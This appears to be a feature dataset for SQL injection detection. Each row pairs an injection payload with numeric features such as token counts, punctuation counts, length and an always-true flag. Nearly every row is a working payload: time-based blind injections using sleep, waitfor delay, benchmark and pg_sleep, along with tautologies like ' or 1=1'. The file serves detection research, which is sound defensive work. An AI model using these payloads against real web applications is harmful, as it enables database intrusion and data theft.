attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	alw_true
sleep(__time__)#	1	0	0	2	1	0	0	16	False
1 or sleep(__time__)#	1	1	0	2	1	1	2	21	False
" or sleep(__time__)#	2	1	0	2	1	0	2	21	False
' or sleep(__time__)#	2	1	0	2	1	0	2	21	False
" or sleep(__time__)="	3	1	0	2	1	0	2	22	False
' or sleep(__time__)='	3	1	0	2	1	0	2	22	False
1) or sleep(__time__)#	1	1	0	2	2	1	2	22	False
") or sleep(__time__)="	3	1	0	2	2	0	2	23	False
') or sleep(__time__)='	3	1	0	2	2	0	2	23	False
1)) or sleep(__time__)#	1	1	0	2	3	1	2	23	False
")) or sleep(__time__)="	3	1	0	2	3	0	2	24	False
')) or sleep(__time__)='	3	1	0	2	3	0	2	24	False
;waitfor delay '0:0:__time__'--	2	2	0	0	6	2	2	31	False
);waitfor delay '0:0:__time__'--	2	2	0	0	7	2	2	32	False
';waitfor delay '0:0:__time__'--	3	2	0	0	6	2	2	32	False
";waitfor delay '0:0:__time__'--	3	2	0	0	6	2	2	32	False
');waitfor delay '0:0:__time__'--	3	2	0	0	7	2	2	33	False
");waitfor delay '0:0:__time__'--	3	2	0	0	7	2	2	33	False
));waitfor delay '0:0:__time__'--	2	2	0	0	8	2	2	33	False
'));waitfor delay '0:0:__time__'--	3	2	0	0	8	2	2	34	False
"));waitfor delay '0:0:__time__'--	3	2	0	0	8	2	2	34	False
benchmark(10000000,md5(1))#	1	2	0	2	3	2	0	27	False
1 or benchmark(10000000,md5(1))#	1	3	0	2	3	3	2	32	False
" or benchmark(10000000,md5(1))#	2	3	0	2	3	2	2	32	False
' or benchmark(10000000,md5(1))#	2	3	0	2	3	2	2	32	False
1) or benchmark(10000000,md5(1))#	1	3	0	2	4	3	2	33	False
") or benchmark(10000000,md5(1))#	2	3	0	2	4	2	2	33	False
') or benchmark(10000000,md5(1))#	2	3	0	2	4	2	2	33	False
1)) or benchmark(10000000,md5(1))#	1	3	0	2	5	3	2	34	False
")) or benchmark(10000000,md5(1))#	2	3	0	2	5	2	2	34	False
')) or benchmark(10000000,md5(1))#	2	3	0	2	5	2	2	34	False
pg_sleep(__time__)--	0	1	0	1	3	0	0	20	False
1 or pg_sleep(__time__)--	0	2	0	1	3	1	2	25	False
" or pg_sleep(__time__)--	1	2	0	1	3	0	2	25	False
' or pg_sleep(__time__)--	1	2	0	1	3	0	2	25	False
1) or pg_sleep(__time__)--	0	2	0	1	4	1	2	26	False
") or pg_sleep(__time__)--	1	2	0	1	4	0	2	26	False
') or pg_sleep(__time__)--	1	2	0	1	4	0	2	26	False
1)) or pg_sleep(__time__)--	0	2	0	1	5	1	2	27	False
")) or pg_sleep(__time__)--	1	2	0	1	5	0	2	27	False
')) or pg_sleep(__time__)--	1	2	0	1	5	0	2	27	False
) or ('x'='x	4	1	0	3	2	0	2	12	True
 or 1=1	1	1	0	0	0	2	2	7	True
; execute immediate 'sel' || 'ect us' || 'er'	8	1	0	0	4	0	8	45	False
benchmark(10000000,md5(1))#	1	2	0	2	3	2	0	27	False
update	0	1	0	0	0	0	0	6	False
";waitfor delay '0:0:__time__'--	3	2	0	0	6	2	2	32	False
1) or pg_sleep(__time__)--	0	2	0	1	4	1	2	26	False
||(elt(-3+5,bin(15),ord(10),hex(char(45))))	1	5	0	6	11	5	0	43	False
